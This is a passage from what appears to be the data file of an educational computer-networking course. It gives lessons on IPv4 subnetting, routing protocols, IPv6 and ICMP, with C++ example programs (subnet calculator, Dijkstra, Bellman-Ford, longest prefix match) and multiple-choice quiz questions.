            {q: 'In CSMA/CD, what happens after a collision is detected?', o: ['Station retransmits immediately', 'Station sends a jam signal and uses binary exponential backoff', 'Station waits for a token', 'Station sends an RTS frame'], a: 1},
          ],
        },
      ]
    },

    // ==================== TAB 3: Network Layer ====================
    {
      id: 'net', t: 'Network Layer',
      topics: [
        {
          t: 'IPv4 Addressing & Subnetting',
          learn: '<div class="learn-section"><div class="learn-h">IPv4 Addressing Fundamentals</div><p class="learn-p">An <b>IPv4 address</b> is a <b>32-bit</b> logical address assigned to a network interface. It is written in <b>dotted decimal notation</b> as four octets separated by dots: <code>192.168.1.100</code>. Each octet ranges from 0 to 255. IPv4 provides approximately <b>4.3 billion</b> (2^32) unique addresses.</p><p class="learn-p">An IP address has two parts: the <b>Network ID</b> (identifies the network) and the <b>Host ID</b> (identifies the specific host on that network). The boundary between these two parts is determined by the <b>subnet mask</b>.</p><div class="learn-code">IP Address:   192.168.1.100  = 11000000.10101000.00000001.01100100\nSubnet Mask:  255.255.255.0  = 11111111.11111111.11111111.00000000\nNetwork ID:   192.168.1.0    (AND of IP &amp; Mask)\nHost ID:      0.0.0.100\nBroadcast:    192.168.1.255  (all host bits = 1)</div></div><div class="learn-section"><div class="learn-h">Classful Addressing</div><p class="learn-p">Originally, IPv4 addresses were divided into <b>five classes</b> (A through E) based on the leading bits of the first octet:</p><table class="learn-table"><tr><th>Class</th><th>Leading Bits</th><th>First Octet Range</th><th>Default Mask</th><th>Networks</th><th>Hosts/Network</th></tr><tr><td>A</td><td>0</td><td>1 - 126</td><td>/8 (255.0.0.0)</td><td>126</td><td>16,777,214</td></tr><tr><td>B</td><td>10</td><td>128 - 191</td><td>/16 (255.255.0.0)</td><td>16,384</td><td>65,534</td></tr><tr><td>C</td><td>110</td><td>192 - 223</td><td>/24 (255.255.255.0)</td><td>2,097,152</td><td>254</td></tr><tr><td>D</td><td>1110</td><td>224 - 239</td><td>N/A (Multicast)</td><td>N/A</td><td>N/A</td></tr><tr><td>E</td><td>1111</td><td>240 - 255</td><td>N/A (Reserved)</td><td>N/A</td><td>N/A</td></tr></table><div class="learn-warn"><b>Warning:</b> 127.0.0.0/8 is reserved for <b>loopback</b> (127.0.0.1 is localhost). It is NOT part of Class A for assignment. The formula for usable hosts is <code>2^h - 2</code> (subtract network and broadcast addresses).</div></div><div class="learn-section"><div class="learn-h">Private IP Ranges (RFC 1918)</div><p class="learn-p">These addresses are <b>not routable on the public Internet</b> and are used within private networks:</p><ul class="learn-list"><li><b>10.0.0.0/8</b> — Class A private range (10.0.0.0 to 10.255.255.255)</li><li><b>172.16.0.0/12</b> — Class B private range (172.16.0.0 to 172.31.255.255)</li><li><b>192.168.0.0/16</b> — Class C private range (192.168.0.0 to 192.168.255.255)</li></ul><p class="learn-p">NAT (Network Address Translation) is used to map private IPs to public IPs for Internet access.</p></div><div class="learn-section"><div class="learn-h">CIDR (Classless Inter-Domain Routing)</div><p class="learn-p">Classful addressing was <b>wasteful</b> — a Class C network only supports 254 hosts while a Class B supports 65,534. CIDR, introduced in 1993, allows <b>variable-length subnet masks (VLSM)</b>. The notation <code>a.b.c.d/n</code> means the first <b>n</b> bits are the network portion.</p><div class="learn-code">192.168.1.0/26\nMask: 255.255.255.192 = 11111111.11111111.11111111.11000000\nNetwork bits: 26, Host bits: 6\nSubnets possible: 4 (from /24)\nHosts per subnet: 2^6 - 2 = 62\n\nSubnet 0: 192.168.1.0   - 192.168.1.63   (Broadcast: .63)\nSubnet 1: 192.168.1.64  - 192.168.1.127  (Broadcast: .127)\nSubnet 2: 192.168.1.128 - 192.168.1.191  (Broadcast: .191)\nSubnet 3: 192.168.1.192 - 192.168.1.255  (Broadcast: .255)</div></div><div class="learn-section"><div class="learn-h">Subnetting — Step by Step</div><p class="learn-p">Subnetting divides a large network into smaller <b>subnets</b>. Here is the systematic approach:</p><ol class="learn-list"><li>Determine how many <b>subnets</b> or <b>hosts per subnet</b> you need.</li><li>Calculate the number of <b>bits to borrow</b> from the host portion: <code>2^s &ge; required subnets</code>.</li><li>Calculate the new <b>subnet mask</b>: original mask + s borrowed bits.</li><li>Calculate <b>hosts per subnet</b>: <code>2^h - 2</code> where <code>h = 32 - new prefix</code>.</li><li>List the subnet ranges: <b>block size = 2^h</b>.</li></ol><div class="learn-code">Problem: Divide 10.0.0.0/8 into subnets with at least 500 hosts each.\n\nStep 1: Need 2^h - 2 &ge; 500  &rarr; h &ge; 9  &rarr; h = 9  (510 hosts)\nStep 2: New prefix = 32 - 9 = /23\nStep 3: Mask = 255.255.254.0\nStep 4: Block size = 2^9 = 512 (but in terms of last variable octet: 2)\nStep 5: Subnets:\n  10.0.0.0/23   (10.0.0.1 to 10.0.1.254, broadcast 10.0.1.255)\n  10.0.2.0/23   (10.0.2.1 to 10.0.3.254, broadcast 10.0.3.255)\n  10.0.4.0/23   ...</div><div class="learn-tip"><b>Tip:</b> For quick subnetting, remember the "magic number" trick: <code>block size = 256 - value of the interesting octet in the subnet mask</code>. For mask 255.255.255.192, block size = 256 - 192 = 64.</div></div><div class="learn-section"><div class="learn-h">Special Addresses</div><table class="learn-table"><tr><th>Address</th><th>Purpose</th></tr><tr><td>0.0.0.0</td><td>Default route / "this network"</td></tr><tr><td>127.0.0.1</td><td>Loopback (localhost)</td></tr><tr><td>255.255.255.255</td><td>Limited broadcast (local network)</td></tr><tr><td>Network ID (host bits all 0)</td><td>Network address (not assignable)</td></tr><tr><td>Broadcast (host bits all 1)</td><td>Directed broadcast (not assignable)</td></tr><tr><td>169.254.0.0/16</td><td>Link-local (APIPA) — when DHCP fails</td></tr></table></div><div class="learn-section"><div class="learn-h">IPv4 Header Format</div><p class="learn-p">The IPv4 header is <b>20-60 bytes</b> long (20 bytes minimum, up to 40 bytes of options).</p><div class="learn-code">0                   1                   2                   3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|Version|  IHL  |    DSCP   |ECN|         Total Length          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|         Identification        |Flags|    Fragment Offset      |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|    TTL    |    Protocol   |       Header Checksum             |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Source IP Address                          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                 Destination IP Address                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><p class="learn-p">Key fields: <b>TTL</b> (Time To Live — decremented at each router, prevents infinite loops), <b>Protocol</b> (6=TCP, 17=UDP, 1=ICMP), <b>Flags</b> (DF=Don\'t Fragment, MF=More Fragments).</p></div><div class="learn-section"><div class="learn-h">Supernetting (Route Aggregation)</div><p class="learn-p"><b>Supernetting</b> is the opposite of subnetting — it combines multiple smaller networks into a single larger network prefix. This is used in routing tables to reduce the number of entries (route aggregation).</p><div class="learn-code">Networks: 192.168.0.0/24, 192.168.1.0/24, 192.168.2.0/24, 192.168.3.0/24\nSupernet: 192.168.0.0/22  (combines all 4 /24 networks)\n\nBinary analysis:\n192.168.0.xxx = 192.168.000000 00.xxxxxxxx\n192.168.1.xxx = 192.168.000000 01.xxxxxxxx\n192.168.2.xxx = 192.168.000000 10.xxxxxxxx\n192.168.3.xxx = 192.168.000000 11.xxxxxxxx\nCommon prefix: 22 bits  &rarr; /22</div></div>',
          code: `// === IPv4 Subnetting Calculator in C++ ===
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <cmath>
#include <bitset>
using namespace std;

// Convert dotted decimal IP to 32-bit integer
uint32_t ipToInt(const string& ip) {
    uint32_t result = 0;
    int octet;
    char dot;
    istringstream iss(ip);
    for (int i = 0; i < 4; i++) {
        iss >> octet;
        if (i < 3) iss >> dot;
        result = (result << 8) | (octet & 0xFF);
    }
    return result;
}

// Convert 32-bit integer to dotted decimal
string intToIP(uint32_t ip) {
    return to_string((ip >> 24) & 0xFF) + "." +
           to_string((ip >> 16) & 0xFF) + "." +
           to_string((ip >> 8) & 0xFF)  + "." +
           to_string(ip & 0xFF);
}

// Generate subnet mask from prefix length
uint32_t prefixToMask(int prefix) {
    if (prefix == 0) return 0;
    return ~((1U << (32 - prefix)) - 1);
}

// Subnet Calculator
void subnetCalculator(const string& ipStr, int prefix) {
    uint32_t ip = ipToInt(ipStr);
    uint32_t mask = prefixToMask(prefix);
    uint32_t network = ip & mask;
    uint32_t broadcast = network | ~mask;
    uint32_t firstHost = network + 1;
    uint32_t lastHost = broadcast - 1;
    int hostBits = 32 - prefix;
    int totalHosts = (1 << hostBits) - 2;

    cout << "=== Subnet Calculator ===" << endl;
    cout << "IP Address:     " << ipStr << "/" << prefix << endl;
    cout << "Subnet Mask:    " << intToIP(mask) << endl;
    cout << "Network:        " << intToIP(network) << endl;
    cout << "Broadcast:      " << intToIP(broadcast) << endl;
    cout << "First Host:     " << intToIP(firstHost) << endl;
    cout << "Last Host:      " << intToIP(lastHost) << endl;
    cout << "Total Hosts:    " << totalHosts << endl;
    cout << "Binary IP:      " << bitset<32>(ip) << endl;
    cout << "Binary Mask:    " << bitset<32>(mask) << endl;
}

// VLSM Subnetting: divide a network into subnets of different sizes
void vlsmSubnetting(const string& networkStr, int prefix,
                    vector<int> hostRequirements) {
    cout << "\\n=== VLSM Subnetting ===" << endl;
    cout << "Network: " << networkStr << "/" << prefix << endl;

    // Sort requirements in descending order (largest first)
    sort(hostRequirements.rbegin(), hostRequirements.rend());

    uint32_t currentNet = ipToInt(networkStr) & prefixToMask(prefix);

    for (int i = 0; i < (int)hostRequirements.size(); i++) {
        int needed = hostRequirements[i];
        // Find smallest power of 2 >= needed + 2
        int hostBits = 1;
        while ((1 << hostBits) - 2 < needed) hostBits++;
        int subnetPrefix = 32 - hostBits;
        uint32_t subnetMask = prefixToMask(subnetPrefix);
        uint32_t broadcast = currentNet | ~subnetMask;

        cout << "\\nSubnet " << i << " (need " << needed << " hosts):" << endl;
        cout << "  Network:   " << intToIP(currentNet) << "/" << subnetPrefix << endl;
        cout << "  Mask:      " << intToIP(subnetMask) << endl;
        cout << "  Range:     " << intToIP(currentNet + 1) << " - "
             << intToIP(broadcast - 1) << endl;
        cout << "  Broadcast: " << intToIP(broadcast) << endl;
        cout << "  Usable:    " << ((1 << hostBits) - 2) << " hosts" << endl;

        // Move to next subnet
        currentNet = broadcast + 1;
    }
}

// Determine IP class
string getClass(const string& ip) {
    int firstOctet = stoi(ip.substr(0, ip.find('.')));
    if (firstOctet >= 1 && firstOctet <= 126) return "Class A";
    if (firstOctet >= 128 && firstOctet <= 191) return "Class B";
    if (firstOctet >= 192 && firstOctet <= 223) return "Class C";
    if (firstOctet >= 224 && firstOctet <= 239) return "Class D (Multicast)";
    return "Class E (Reserved)";
}

// Check if two IPs are on the same subnet
bool sameSubnet(const string& ip1, const string& ip2, int prefix) {
    uint32_t mask = prefixToMask(prefix);
    return (ipToInt(ip1) & mask) == (ipToInt(ip2) & mask);
}

int main() {
    subnetCalculator("192.168.1.130", 26);

    cout << "\\n--- IP Classification ---" << endl;
    vector<string> ips = {"10.0.0.1", "172.16.5.1", "192.168.1.1",
                          "224.0.0.1", "8.8.8.8"};
    for (auto& ip : ips)
        cout << ip << " -> " << getClass(ip) << endl;

    cout << "\\n--- Same Subnet? ---" << endl;
    cout << "192.168.1.10 & 192.168.1.200 on /24: "
         << (sameSubnet("192.168.1.10","192.168.1.200",24) ? "YES":"NO") << endl;
    cout << "192.168.1.10 & 192.168.1.200 on /26: "
         << (sameSubnet("192.168.1.10","192.168.1.200",26) ? "YES":"NO") << endl;

    // VLSM example: divide 10.0.0.0/24 into subnets for 100, 50, 25, 10 hosts
    vlsmSubnetting("10.0.0.0", 24, {100, 50, 25, 10});

    return 0;
}`,
          problems: [
            ['Subnetting Practice on GFG', 'https://www.geeksforgeeks.org/introduction-to-subnetting/', 'Medium'],
            ['IP Address Defanging (LeetCode 1108)', 'https://leetcode.com/problems/defanging-an-ip-address/', 'Easy'],
            ['Restore IP Addresses (LeetCode 93)', 'https://leetcode.com/problems/restore-ip-addresses/', 'Medium'],
            ['VLSM Subnetting Problems', 'https://www.geeksforgeeks.org/introduction-of-variable-length-subnet-mask-vlsm/', 'Hard'],
          ],
          mcqs: [
            {q: 'How many usable host addresses are in a /26 subnet?', o: ['64', '62', '30', '126'], a: 1},
            {q: 'Which private IP range belongs to Class B?', o: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.0.0/16'], a: 1},
            {q: 'A host has IP 192.168.10.65/27. What is its subnet\'s broadcast address?', o: ['192.168.10.95', '192.168.10.63', '192.168.10.127', '192.168.10.79'], a: 0},
          ],
        },
        {
          t: 'Routing Protocols',
          learn: '<div class="learn-section"><div class="learn-h">What is Routing?</div><p class="learn-p"><b>Routing</b> is the process of selecting the best path for a packet to travel from source to destination across interconnected networks. <b>Routers</b> maintain <b>routing tables</b> that map destination network prefixes to next-hop addresses and output interfaces. Routing can be <b>static</b> (manually configured) or <b>dynamic</b> (learned via routing protocols).</p><p class="learn-p">A routing table entry typically contains: <b>Destination network</b>, <b>Subnet mask</b>, <b>Next hop</b>, <b>Interface</b>, and <b>Metric</b> (cost). When a packet arrives, the router performs <b>longest prefix matching</b> to find the best route.</p></div><div class="learn-section"><div class="learn-h">Longest Prefix Match</div><p class="learn-p">When multiple routing table entries match a destination IP, the router uses the entry with the <b>longest (most specific) matching prefix</b>. This is the fundamental forwarding algorithm used in IP routing.</p><div class="learn-code">Routing Table:\n  10.0.0.0/8      ->  Interface A\n  10.1.0.0/16     ->  Interface B\n  10.1.1.0/24     ->  Interface C\n  0.0.0.0/0       ->  Interface D  (default route)\n\nPacket to 10.1.1.50:\n  Matches /8, /16, AND /24.  Longest prefix = /24 &rarr; Interface C\n\nPacket to 10.2.3.4:\n  Matches only /8.  &rarr; Interface A\n\nPacket to 8.8.8.8:\n  No specific match.  &rarr; Default route (Interface D)</div></div><div class="learn-section"><div class="learn-h">Interior vs Exterior Routing Protocols</div><p class="learn-p">The Internet is divided into <b>Autonomous Systems (AS)</b>. Each AS is a collection of networks under a single administrative authority (e.g., an ISP, a company).</p><ul class="learn-list"><li><b>IGP (Interior Gateway Protocol):</b> Routes within an AS. Examples: RIP, OSPF, EIGRP, IS-IS.</li><li><b>EGP (Exterior Gateway Protocol):</b> Routes between ASes. The primary example today is <b>BGP</b>.</li></ul></div><div class="learn-section"><div class="learn-h">Distance Vector Routing — RIP</div><p class="learn-p"><b>Distance Vector</b> protocols use the <b>Bellman-Ford algorithm</b>. Each router maintains a table of <b>(destination, distance, next hop)</b> and periodically shares its entire routing table with its <b>directly connected neighbors</b>.</p><p class="learn-p"><b>RIP (Routing Information Protocol):</b></p><ul class="learn-list"><li>Metric: <b>Hop count</b> (maximum 15; 16 = unreachable).</li><li>Updates sent every <b>30 seconds</b> via broadcast/multicast.</li><li>Uses <b>UDP port 520</b>.</li><li>Converges slowly ("counting to infinity" problem).</li></ul><p class="learn-p"><b>Count to Infinity Problem:</b> When a link goes down, routers may keep incrementing the hop count in a loop, slowly counting up to infinity (16). Solutions include:</p><ul class="learn-list"><li><b>Split Horizon:</b> Don\'t advertise a route back to the neighbor you learned it from.</li><li><b>Poison Reverse:</b> Advertise the failed route with metric = infinity (16) back to the neighbor.</li><li><b>Triggered Updates:</b> Send immediate updates when a topology change occurs (don\'t wait 30s).</li><li><b>Hold-Down Timer:</b> After learning of a failure, ignore updates about that route for a period.</li></ul><div class="learn-code">Bellman-Ford Update Rule:\nFor each destination d:\n  D(x, d) = min over all neighbors v { cost(x,v) + D(v,d) }\n\nRouter A\'s table after exchange with neighbor B:\n  Dest | Cost via B\n  C    | cost(A,B) + D(B,C) = 1 + 2 = 3\n  D    | cost(A,B) + D(B,D) = 1 + 1 = 2</div></div><div class="learn-section"><div class="learn-h">Link State Routing — OSPF</div><p class="learn-p"><b>Link State</b> protocols use <b>Dijkstra\'s algorithm</b>. Each router discovers its neighbors, measures link costs, constructs a <b>Link State Advertisement (LSA)</b>, floods it to <b>all</b> routers in the area, and independently computes the shortest path tree using Dijkstra.</p><p class="learn-p"><b>OSPF (Open Shortest Path First):</b></p><ul class="learn-list"><li>Metric: <b>Cost</b> (typically based on bandwidth: cost = 10^8 / bandwidth in bps).</li><li>Uses <b>IP protocol 89</b> directly (not TCP/UDP).</li><li>Supports <b>areas</b> for hierarchical routing (Area 0 is the backbone).</li><li>Fast convergence via immediate LSA flooding.</li><li>Supports <b>equal-cost multi-path (ECMP)</b> routing.</li><li>Uses <b>Designated Router (DR)</b> and <b>Backup DR (BDR)</b> on broadcast networks to reduce LSA flooding overhead.</li></ul><div class="learn-code">Dijkstra\'s Algorithm (SPF Calculation):\n1. Initialize: dist[source] = 0, dist[all others] = infinity\n2. Add source to SPF tree\n3. For each node u in SPF tree:\n   For each neighbor v of u:\n     If dist[u] + cost(u,v) &lt; dist[v]:\n       dist[v] = dist[u] + cost(u,v)\n       next_hop[v] = (via u)\n4. Pick unvisited node with smallest dist, add to tree\n5. Repeat until all nodes in tree</div></div><div class="learn-section"><div class="learn-h">Distance Vector vs Link State</div><table class="learn-table"><tr><th>Feature</th><th>Distance Vector (RIP)</th><th>Link State (OSPF)</th></tr><tr><td>Algorithm</td><td>Bellman-Ford</td><td>Dijkstra</td></tr><tr><td>Knowledge</td><td>Only neighbors\' tables</td><td>Entire network topology</td></tr><tr><td>Updates</td><td>Periodic (every 30s), full table</td><td>Event-driven, LSA floods</td></tr><tr><td>Convergence</td><td>Slow</td><td>Fast</td></tr><tr><td>Scalability</td><td>Small networks (max 15 hops)</td><td>Large networks (area hierarchy)</td></tr><tr><td>Loop Prevention</td><td>Split horizon, poison reverse</td><td>Inherent (complete topology)</td></tr><tr><td>CPU/Memory</td><td>Low</td><td>Higher (stores full topology)</td></tr></table></div><div class="learn-section"><div class="learn-h">BGP (Border Gateway Protocol)</div><p class="learn-p"><b>BGP</b> is the <b>only EGP in use today</b> and is responsible for routing between Autonomous Systems on the Internet. It is a <b>path vector</b> protocol — it maintains the full AS path to prevent loops.</p><ul class="learn-list"><li>Uses <b>TCP port 179</b> for reliable delivery.</li><li><b>eBGP:</b> Between different ASes (external). <b>iBGP:</b> Within the same AS (internal).</li><li>Path selection considers: AS path length, local preference, MED, origin type, etc.</li><li>BGP does NOT find the "shortest" path — it uses <b>policy-based routing</b>.</li><li>The Internet\'s <b>default-free zone (DFZ)</b> BGP table contains ~900,000+ prefixes (as of 2024).</li></ul><div class="learn-tip"><b>Tip:</b> In interviews, know that BGP is the "glue of the Internet." Major Internet outages (like the Facebook 2021 outage) are often caused by BGP misconfigurations.</div></div><div class="learn-section"><div class="learn-h">ICMP and Traceroute</div><p class="learn-p"><b>ICMP (Internet Control Message Protocol)</b> operates at the Network Layer and is used for error reporting and diagnostics. Key ICMP messages:</p><ul class="learn-list"><li><b>Echo Request/Reply (Type 8/0):</b> Used by <code>ping</code>.</li><li><b>Destination Unreachable (Type 3):</b> Network/host/port unreachable.</li><li><b>Time Exceeded (Type 11):</b> TTL expired — used by <code>traceroute</code>.</li><li><b>Redirect (Type 5):</b> Informs host of a better route.</li></ul><p class="learn-p"><b>Traceroute</b> works by sending packets with incrementing TTL values (1, 2, 3, ...). Each router along the path decrements TTL and sends back an ICMP Time Exceeded message when TTL reaches 0, revealing its IP address.</p></div><div class="learn-section"><div class="learn-h">NAT (Network Address Translation)</div><p class="learn-p">NAT translates <b>private IP addresses</b> to <b>public IP addresses</b> (and vice versa) at the router. Types:</p><ul class="learn-list"><li><b>Static NAT:</b> One-to-one mapping (private IP &harr; public IP).</li><li><b>Dynamic NAT:</b> Maps from a pool of public IPs.</li><li><b>PAT (Port Address Translation) / NAT Overload:</b> Many private IPs share one public IP, differentiated by port numbers. Most common in home routers.</li></ul></div>',
          code: `// === Routing Algorithms in C++ ===
// Dijkstra (OSPF) and Bellman-Ford (RIP) implementations
#include <iostream>
#include <vector>
#include <queue>
#include <climits>
#include <tuple>
using namespace std;

const int INF = INT_MAX;

// ---- Dijkstra's Algorithm (used by OSPF) ----
struct Edge {
    int to, cost;
};

void dijkstra(int src, vector<vector<Edge>>& graph, int n) {
    vector<int> dist(n, INF);
    vector<int> parent(n, -1);
    vector<bool> visited(n, false);
    // min-heap: (distance, node)
    priority_queue<pair<int,int>, vector<pair<int,int>>,
                   greater<pair<int,int>>> pq;

    dist[src] = 0;
    pq.push({0, src});

    while (!pq.empty()) {
        auto [d, u] = pq.top(); pq.pop();
        if (visited[u]) continue;
        visited[u] = true;

        for (auto& [v, w] : graph[u]) {
            if (dist[u] + w < dist[v]) {
                dist[v] = dist[u] + w;
                parent[v] = u;
                pq.push({dist[v], v});
            }
        }
    }

    cout << "=== Dijkstra (OSPF SPF) from node " << src << " ===" << endl;
    for (int i = 0; i < n; i++) {
        cout << "  To node " << i << ": cost = ";
        if (dist[i] == INF) cout << "INF";
        else cout << dist[i];

        // Print path
        if (dist[i] != INF && i != src) {
            vector<int> path;
            for (int v = i; v != -1; v = parent[v])
                path.push_back(v);
            cout << "  Path: ";
            for (int j = path.size()-1; j >= 0; j--) {
                cout << path[j];
                if (j > 0) cout << " -> ";
            }
        }
        cout << endl;
    }
}

// ---- Bellman-Ford Algorithm (used by RIP) ----
struct WeightedEdge {
    int from, to, cost;
};

void bellmanFord(int src, vector<WeightedEdge>& edges, int n) {
    vector<int> dist(n, INF);
    vector<int> parent(n, -1);
    dist[src] = 0;

    // Relax all edges (n-1) times
    for (int i = 0; i < n - 1; i++) {
        bool updated = false;
        for (auto& [u, v, w] : edges) {
            if (dist[u] != INF && dist[u] + w < dist[v]) {
                dist[v] = dist[u] + w;
                parent[v] = u;
                updated = true;
            }
        }
        if (!updated) break; // early termination
    }

    // Check for negative cycles
    bool negativeCycle = false;
    for (auto& [u, v, w] : edges) {
        if (dist[u] != INF && dist[u] + w < dist[v]) {
            negativeCycle = true;
            break;
        }
    }

    cout << "\\n=== Bellman-Ford (RIP) from node " << src << " ===" << endl;
    if (negativeCycle) {
        cout << "  Negative cycle detected!" << endl;
        return;
    }
    for (int i = 0; i < n; i++) {
        cout << "  To node " << i << ": cost = ";
        if (dist[i] == INF) cout << "INF";
        else cout << dist[i];
        cout << endl;
    }
}

// ---- Longest Prefix Match Simulation ----
struct RouteEntry {
    uint32_t network;
    int prefix;
    string nextHop;
};

uint32_t ipToInt(int a, int b, int c, int d) {
    return (a << 24) | (b << 16) | (c << 8) | d;
}

string longestPrefixMatch(uint32_t destIP, vector<RouteEntry>& table) {
    int bestPrefix = -1;
    string bestHop = "DROP";

    for (auto& entry : table) {
        uint32_t mask = (entry.prefix == 0) ? 0 :
                        ~((1U << (32 - entry.prefix)) - 1);
        if ((destIP & mask) == (entry.network & mask)) {
            if (entry.prefix > bestPrefix) {
                bestPrefix = entry.prefix;
                bestHop = entry.nextHop;
            }
        }
    }
    return bestHop;
}

int main() {
    // Build a sample network graph (5 routers)
    // 0 -- 1 (cost 4), 0 -- 2 (cost 1), 1 -- 3 (cost 1)
    // 2 -- 1 (cost 2), 2 -- 3 (cost 5), 3 -- 4 (cost 3)
    int n = 5;
    vector<vector<Edge>> graph(n);
    graph[0] = {{1,4}, {2,1}};
    graph[1] = {{0,4}, {2,2}, {3,1}};
    graph[2] = {{0,1}, {1,2}, {3,5}};
    graph[3] = {{1,1}, {2,5}, {4,3}};
    graph[4] = {{3,3}};

    dijkstra(0, graph, n);

    // Bellman-Ford with edge list
    vector<WeightedEdge> edges = {
        {0,1,4},{0,2,1},{1,0,4},{1,2,2},{1,3,1},
        {2,0,1},{2,1,2},{2,3,5},{3,1,1},{3,2,5},
        {3,4,3},{4,3,3}
    };
    bellmanFord(0, edges, n);

    // Longest Prefix Match
    cout << "\\n=== Longest Prefix Match ===" << endl;
    vector<RouteEntry> routeTable = {
        {ipToInt(10,0,0,0),   8,  "InterfaceA"},
        {ipToInt(10,1,0,0),   16, "InterfaceB"},
        {ipToInt(10,1,1,0),   24, "InterfaceC"},
        {ipToInt(0,0,0,0),    0,  "Default"}
    };

    uint32_t test1 = ipToInt(10,1,1,50);
    uint32_t test2 = ipToInt(10,2,3,4);
    uint32_t test3 = ipToInt(8,8,8,8);
    cout << "10.1.1.50 -> " << longestPrefixMatch(test1, routeTable) << endl;
    cout << "10.2.3.4  -> " << longestPrefixMatch(test2, routeTable) << endl;
    cout << "8.8.8.8   -> " << longestPrefixMatch(test3, routeTable) << endl;

    return 0;
}`,
          problems: [
            ['Network Delay Time (LeetCode 743)', 'https://leetcode.com/problems/network-delay-time/', 'Medium'],
            ['Cheapest Flights Within K Stops (LeetCode 787)', 'https://leetcode.com/problems/cheapest-flights-within-k-stops/', 'Medium'],
            ['Routing Protocols Comparison', 'https://www.geeksforgeeks.org/difference-between-rip-and-ospf/', 'Easy'],
          ],
          mcqs: [
            {q: 'OSPF uses which shortest-path algorithm?', o: ['Bellman-Ford', 'Floyd-Warshall', 'Dijkstra', 'A* Search'], a: 2},
            {q: 'BGP operates on which TCP port?', o: ['80', '520', '179', '443'], a: 2},
            {q: 'Which problem is specific to Distance Vector routing protocols?', o: ['LSA flooding', 'Area partitioning', 'Count to infinity', 'Designated router election'], a: 2},
          ],
        },
        {
          t: 'IPv6 & ICMP',
          learn: '<div class="learn-section"><div class="learn-h">Why IPv6?</div><p class="learn-p">IPv4 uses 32-bit addresses (~4.3 billion), which are <b>exhausted</b>. IPv6 uses <b>128-bit addresses</b> (~3.4 × 10³⁸), solving the address shortage. IPv6 also improves routing efficiency, security (mandatory IPsec support), and eliminates the need for NAT.</p></div><div class="learn-section"><div class="learn-h">IPv6 Address Format</div><div class="learn-code">Full:       2001:0db8:0000:0000:0000:0000:0000:0001\nShortened:  2001:db8::1  (:: replaces consecutive groups of zeros)\n\nNotation: 8 groups of 4 hex digits, separated by colons\nPrefix:   2001:db8::/32 (similar to CIDR notation)\n\nSpecial addresses:\n::1          — Loopback (like 127.0.0.1 in IPv4)\n::           — Unspecified (like 0.0.0.0)\nfe80::/10    — Link-local (auto-configured, non-routable)\nff00::/8     — Multicast\n2000::/3     — Global unicast (publicly routable)</div></div><div class="learn-section"><div class="learn-h">IPv6 Header (Simplified)</div><p class="learn-p">IPv6 has a <b>fixed 40-byte header</b> (vs IPv4\'s variable 20-60 bytes). This simplifies router processing.</p><div class="learn-code">IPv6 Header Fields:\n| Version (4 bits) = 6                    |\n| Traffic Class (8 bits) — QoS priority   |\n| Flow Label (20 bits) — identifies flows  |\n| Payload Length (16 bits)                |\n| Next Header (8 bits) — protocol (TCP=6) |\n| Hop Limit (8 bits) — like TTL in IPv4   |\n| Source Address (128 bits)               |\n| Destination Address (128 bits)          |</div><p class="learn-p"><b>Key differences from IPv4:</b></p><table class="learn-table"><tr><th>Feature</th><th>IPv4</th><th>IPv6</th></tr><tr><td>Address size</td><td>32 bits</td><td>128 bits</td></tr><tr><td>Header size</td><td>Variable (20-60 bytes)</td><td>Fixed (40 bytes)</td></tr><tr><td>Header checksum</td><td>Yes</td><td>No (handled by upper layers)</td></tr><tr><td>Fragmentation</td><td>Routers can fragment</td><td>Only source host fragments</td></tr><tr><td>Broadcast</td><td>Yes</td><td>No (replaced by multicast/anycast)</td></tr><tr><td>NAT</td><td>Common</td><td>Not needed (enough addresses)</td></tr><tr><td>IPsec</td><td>Optional</td><td>Mandatory support</td></tr><tr><td>Configuration</td><td>DHCP or manual</td><td>SLAAC (Stateless Address Auto-Configuration) or DHCPv6</td></tr></table></div><div class="learn-section"><div class="learn-h">IPv4 to IPv6 Transition</div><p class="learn-p">Since both protocols coexist, three main transition mechanisms are used:</p><ul class="learn-list"><li><b>Dual Stack:</b> Nodes run both IPv4 and IPv6 simultaneously. Preferred method.</li><li><b>Tunneling (6in4, 6to4):</b> IPv6 packets encapsulated inside IPv4 packets to traverse IPv4 networks.</li><li><b>NAT64/DNS64:</b> Translates between IPv4 and IPv6. Allows IPv6-only hosts to communicate with IPv4 servers.</li></ul></div><div class="learn-section"><div class="learn-h">ICMP (Internet Control Message Protocol)</div><p class="learn-p"><b>ICMP</b> is a <b>network-layer protocol</b> used for error reporting and diagnostics. It rides on top of IP (protocol number 1 for ICMPv4, 58 for ICMPv6).</p><p class="learn-p"><b>Common ICMP message types:</b></p><table class="learn-table"><tr><th>Type</th><th>Name</th><th>Purpose</th></tr><tr><td>0</td><td>Echo Reply</td><td>Response to ping</td></tr><tr><td>3</td><td>Destination Unreachable</td><td>Host/network/port unreachable</td></tr><tr><td>5</td><td>Redirect</td><td>Inform host of better route</td></tr><tr><td>8</td><td>Echo Request</td><td>Ping request</td></tr><tr><td>11</td><td>Time Exceeded</td><td>TTL expired (used by traceroute)</td></tr></table></div><div class="learn-section"><div class="learn-h">ping &amp; traceroute</div><p class="learn-p"><b>ping</b> sends ICMP Echo Request (type 8) and waits for Echo Reply (type 0). Measures round-trip time and packet loss.</p><p class="learn-p"><b>traceroute</b> sends packets with incrementing TTL values (1, 2, 3...). Each router that decrements TTL to 0 sends back an ICMP Time Exceeded message, revealing its IP address. This maps the network path.</p><div class="learn-code">$ traceroute google.com\n1  192.168.1.1      1.2 ms    (home router, TTL=1 expired here)\n2  10.0.0.1         5.3 ms    (ISP gateway, 